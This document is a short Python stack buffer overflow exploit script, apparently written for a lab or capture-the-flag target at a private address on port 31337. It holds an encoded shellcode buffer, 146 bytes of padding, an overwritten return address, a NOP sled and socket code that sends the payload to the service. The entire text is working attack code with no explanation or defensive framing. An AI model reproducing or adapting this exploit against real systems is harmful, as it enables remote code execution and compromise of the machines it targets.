#Exploit skeleton

#!/usr/bin/python

import socket,sys

from time import sleep

buf =  b""
buf += b"\xda\xcb\xd9\x74\x24\xf4\xba\x6d\xa8\x34\x1d\x5e\x33"
buf += b"\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x83\x54\xd6"
buf += b"\xe8\xa7\x4d\x95\x13\x57\x8e\xfa\x9a\xb2\xbf\x3a\xf8"
buf += b"\xb7\x90\x8a\x8a\x95\x1c\x60\xde\x0d\x96\x04\xf7\x22"
buf += b"\x1f\xa2\x21\x0d\xa0\x9f\x12\x0c\x22\xe2\x46\xee\x1b"
buf += b"\x2d\x9b\xef\x5c\x50\x56\xbd\x35\x1e\xc5\x51\x31\x6a"
buf += b"\xd6\xda\x09\x7a\x5e\x3f\xd9\x7d\x4f\xee\x51\x24\x4f"
buf += b"\x11\xb5\x5c\xc6\x09\xda\x59\x90\xa2\x28\x15\x23\x62"
buf += b"\x61\xd6\x88\x4b\x4d\x25\xd0\x8c\x6a\xd6\xa7\xe4\x88"
buf += b"\x6b\xb0\x33\xf2\xb7\x35\xa7\x54\x33\xed\x03\x64\x90"
buf += b"\x68\xc0\x6a\x5d\xfe\x8e\x6e\x60\xd3\xa5\x8b\xe9\xd2"
buf += b"\x69\x1a\xa9\xf0\xad\x46\x69\x98\xf4\x22\xdc\xa5\xe6"
buf += b"\x8c\x81\x03\x6d\x20\xd5\x39\x2c\x2d\x1a\x70\xce\xad"
buf += b"\x34\x03\xbd\x9f\x9b\xbf\x29\xac\x54\x66\xae\xd3\x4e"
buf += b"\xde\x20\x2a\x71\x1f\x69\xe9\x25\x4f\x01\xd8\x45\x04"
buf += b"\xd1\xe5\x93\x8b\x81\x49\x4c\x6c\x71\x2a\x3c\x04\x9b"
buf += b"\xa5\x63\x34\xa4\x6f\x0c\xdf\x5f\xf8\x39\x28\x12\xdc"
buf += b"\x55\x2a\xac\x18\x74\xa3\x4a\x4a\x68\xe2\xc5\xe3\x11"
buf += b"\xaf\x9d\x92\xde\x65\xd8\x95\x55\x8a\x1d\x5b\x9e\xe7"
buf += b"\x0d\x0c\x6e\xb2\x6f\x9b\x71\x68\x07\x47\xe3\xf7\xd7"
buf += b"\x0e\x18\xa0\x80\x47\xee\xb9\x44\x7a\x49\x10\x7a\x87"
buf += b"\x0f\x5b\x3e\x5c\xec\x62\xbf\x11\x48\x41\xaf\xef\x51"
buf += b"\xcd\x9b\xbf\x07\x9b\x75\x06\xfe\x6d\x2f\xd0\xad\x27"
buf += b"\xa7\xa5\x9d\xf7\xb1\xa9\xcb\x81\x5d\x1b\xa2\xd7\x62"
buf += b"\x94\x22\xd0\x1b\xc8\xd2\x1f\xf6\x48\xe2\x55\x5a\xf8"
buf += b"\x6b\x30\x0f\xb8\xf1\xc3\xfa\xff\x0f\x40\x0e\x80\xeb"
buf += b"\x58\x7b\x85\xb0\xde\x90\xf7\xa9\x8a\x96\xa4\xca\x9e"


ip="10.10.23.185"

port="31337"

bof = "A" * 146 + "\xC3\x14\x04\x08" + "\x90" * 10 + buf

try:

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    s.connect(('10.10.23.185',31337))

    s.send(bof + '\r\n')

    s.recv(1024)

    s.close()

except:

    sys.exit(0)
